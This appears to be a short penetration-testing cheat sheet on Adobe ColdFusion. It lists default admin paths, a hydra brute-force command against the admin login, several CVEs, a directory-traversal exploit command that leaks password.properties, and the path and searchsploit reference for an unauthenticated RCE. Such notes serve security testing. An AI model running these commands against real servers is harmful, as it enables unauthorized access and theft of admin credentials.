## <span style="color:#8BE9FD">What is ColdFusion?</span>
- ColdFusion is a web development platform owned by Adobe.
- It uses a special language called CFML (ColdFusion Markup Language), which looks like HTML but has extra powers.
- It helps developers quickly make dynamic websites, connect to databases, and even send emails or create PDFs.
- Default Files	`/CFIDE/administrator/index.cfm` (Admin login).
- Brute Force Default Creds: `hydra -l admin -P /usr/share/wordlists/rockyou.txt $VICTIM_IP http-post-form "/CFIDE/administrator/enter.cfm:cfadminPassword=^PASS^&requestedURL=&submit=Login:F=Invalid"`
### <span style="color:#50FA7B">CVE's</span>
- CVE-2021-21087	JSP upload bypass
- CVE-2020-24450	Command Injection
- CVE-2020-24449	File Read
- CVE-2019-15909	Cross-Site Scripting (XSS)

### <span style="color:#50FA7B">Directory Traversal (CVE-2010-2861)</span>

- Vulnerable Endpoints
    - `/CFIDE/administrator/settings/mappings.cfm`
    -   `/CFIDE/administrator/enter.cfm`
- Exploit `python2 14641.py $VICTIM_IP 8500 "../../../../../../../../ColdFusion8/lib/password.properties"`Leak password.properties (contains encrypted admin passwords).

### <span style="color:#50FA7B">Unauthenticated RCE (CVE-2009-2265)</span>
- Vulnerable Path `/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm`
- use exploit `searchsploit -m 50057.py`
